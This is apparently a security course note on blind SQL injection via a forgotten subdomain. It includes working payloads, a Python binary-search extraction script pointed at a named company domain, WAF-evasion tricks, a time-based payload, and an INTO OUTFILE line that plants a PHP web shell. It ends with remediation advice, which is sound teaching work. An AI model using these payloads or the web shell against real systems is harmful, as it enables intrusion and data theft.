---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.10 Uber Bug SQLi"
---

# 60.10 Uber Bug: SQL Injection via Forgotten Subdomain

## 1. Introduction

Despite decades of awareness and the widespread adoption of Object-Relational Mappers (ORMs), SQL Injection (SQLi) remains a critical threat. In massive enterprise environments, the risk rarely stems from the primary, heavily audited web application. Instead, it frequently originates from "shadow IT"—forgotten subdomains, legacy marketing sites, or infrastructure acquired through corporate mergers.

This document dissects a scenario inspired by a famous bug bounty report involving a ridesharing giant (similar to the Uber bugs). The vulnerability was a classic Boolean-based Blind SQL Injection residing on an unmaintained, obscure subdomain that maintained a connection to a highly sensitive backend database. This note explores the mechanics of blind SQLi, the process of automated data extraction using binary search, and the immense impact of external perimeter sprawl.

## 2. Architecture and Data Flow

Large organizations manage tens of thousands of subdomains. A forgotten subdomain might host a PHP application written five years ago for a specific marketing campaign. While the frontend application is abandoned, the backend database connection strings often remain active, pointing to core databases.

### The Attack Flow Diagram

```text
+------------------+                                 +-------------------------+
|                  |                                 |                         |
|  Attacker        | =======(1) Malicious GET=======>| legacy.uber.com         |
|                  |        ?id=1 AND (SELECT...)    | (Forgotten Subdomain)   |
+------------------+                                 +-----------+-------------+
         |                                                       |
         ^                                                       | (2) Vulnerable Query
         |                                                       v
         |                                           +-------------------------+
         |                                           |                         |
         | (4) True/False HTTP Response              | Shared Internal DB      |
         |     (e.g., 200 OK vs 404 Not Found)       | (MySQL / PostgreSQL)    |
         +===========================================+-------------------------+
                                                                 |
                                                                 | (3) Evaluates Boolean
                                                                 v
                                                     [ DB Version Exfiltrated Byte by Byte ]
```

## 3. Vulnerability Mechanics: Boolean-Based Blind SQLi

Unlike Error-Based or Union-Based SQLi, where the database results are visibly reflected in the HTML response, Blind SQLi occurs when the application is vulnerable to injection but does not display any direct database output.

### The Vulnerable Parameter
Consider a legacy endpoint: `GET /promotions/view?id=123`.
The backend PHP code executes:
```php
$id = $_GET['id'];
// FLAW: Direct concatenation into the SQL string
$result = $db->query("SELECT title, description FROM promos WHERE id = " . $id);

if ($result->num_rows > 0) {
    echo "<h1>Promotion Exists</h1>";
} else {
    echo "<h1>Promotion Not Found</h1>";
}
```

### The Boolean Inference
The attacker cannot see the `title` or `description`. They can only see if the page says "Promotion Exists" (True) or "Promotion Not Found" (False).
The attacker injects a boolean condition:
- `?id=123 AND 1=1` -> The query is `WHERE id = 123 AND 1=1`. The condition is True. The page returns "Promotion Exists".
- `?id=123 AND 1=0` -> The query is `WHERE id = 123 AND 1=0`. The condition is False. The page returns "Promotion Not Found".

Because the attacker can control the boolean condition and observe the application's response, they can ask the database arbitrary YES/NO questions.

## 4. The Exploit Step-by-Step: Binary Search Data Extraction

Extracting an entire database via YES/NO questions is tedious. Attackers write custom Python scripts that use a binary search algorithm to extract data byte-by-byte, dramatically speeding up the process.

### Step 1: Asking the Database a Question
To extract the first character of the database version (e.g., "5.7.33"), the attacker crafts a payload using SQL string manipulation functions (`SUBSTRING`, `ASCII`).

Payload: `?id=123 AND ASCII(SUBSTRING(@@version, 1, 1)) > 50`
This translates to: "Is the ASCII value of the first character of the database version greater than 50?"

### Step 2: The Binary Search Logic
The attacker's script automates the questioning:
1. Is it > 64? (True)
2. Is it > 96? (False)
3. Is it > 80? (False)
... It rapidly narrows down the ASCII value until it identifies the exact character. It then moves to the second character: `SUBSTRING(@@version, 2, 1)`.

### Exploit Script Snippet (Python)

```python
import requests

url = "https://legacy.uber.com/promotions/view"
def inject_query(query):
    # The payload asks a boolean question
    payload = f"123 AND ({query})"
    res = requests.get(url, params={"id": payload})
    # If "Promotion Exists" is in the response, the query was TRUE
    return "Promotion Exists" in res.text

def extract_byte_binary_search(index):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        # Asking: Is the ASCII value greater than 'mid'?
        if inject_query(f"ASCII(SUBSTRING(@@version, {index}, 1)) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

version = ""
for i in range(1, 10):
    version += extract_byte_binary_search(i)
    print(f"Current Extracted Version: {version}")
```

## 5. Advanced Bypasses: WAF Evasion and Time-Based SQLi

If the application is protected by a WAF that blocks common SQL keywords like `AND`, `OR`, `SELECT`, or `UNION`, attackers must obfuscate their payloads.
- **Keyword Substitution:** Using `&&` instead of `AND`, `||` instead of `OR`.
- **Comment Injection:** `S/**/E/**/L/**/E/**/C/**/T` to break up signatures.
- **Encoding:** URL encoding or hex encoding the payloads.

### Time-Based Blind SQLi
If the application always returns the exact same HTML regardless of whether the query is True or False (defeating Boolean-based SQLi), the attacker uses Time-Based payloads.
They instruct the database to pause execution (`SLEEP(5)` or `pg_sleep(5)`) if the condition is true.

Payload: `?id=123; IF (ASCII(SUBSTRING(@@version, 1, 1)) = 53) WAITFOR DELAY '0:0:5'--`
If the HTTP response takes more than 5 seconds, the attacker knows the condition was true. This is slower but highly reliable.

## 6. Real-World Consequences

A single SQLi on an obscure subdomain can lead to the complete compromise of the primary enterprise infrastructure.
- **Database Dump:** Exfiltration of millions of user records, hashed passwords, and financial data.
- **Lateral Movement:** If the database user has high privileges, the attacker can use commands like `INTO OUTFILE` (MySQL) or `xp_cmdshell` (MSSQL) to write web shells to the file system, escalating the SQLi to full Remote Code Execution (RCE) on the database server. From there, they pivot into the internal corporate network.

## 7. Secure Coding and Remediation

### 1. Parameterized Queries (Prepared Statements)
The only definitive defense against SQL Injection is the rigorous use of parameterized queries. Prepared statements ensure that the database engine treats user input strictly as data, never as executable code, regardless of the input's content.

**Secure Code Snippet (PHP PDO)**
```php
<?php
// Secure implementation using PDO
$id = $_GET['id'];

// FLAW FIXED: The SQL string contains a placeholder (?)
$stmt = $pdo->prepare('SELECT title, description FROM promos WHERE id = ?');
// The parameter is bound securely during execution
$stmt->execute([$id]);
$result = $stmt->fetchAll();

if ($result) {
    echo "<h1>Promotion Exists</h1>";
} else {
    echo "<h1>Promotion Not Found</h1>";
}
?>
```

### 2. External Attack Surface Management (EASM)
The vulnerability existed because the subdomain was forgotten. Organizations must implement continuous EASM to discover, catalog, and secure all internet-facing assets. Legacy applications should be decommissioned and taken offline, not simply ignored.

## 8. Chaining Opportunities

- **SQLi to RCE:** Exploiting the SQL injection to execute `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`.
- **Subdomain Takeover to SQLi Discovery:** An attacker finds a dangling CNAME record for a subdomain, takes it over, and uses the resulting traffic analysis to discover hidden API endpoints that point back to the vulnerable legacy backend.

## 9. Related Notes

- [[10 - SQL Injection (SQLi) Masterclass]]
- [[16 - External Attack Surface Management]]
- [[17 - Exploiting Blind and Time-Based SQLi]]
- [[06 - HackerOne Disclosed Reports Top 10]]
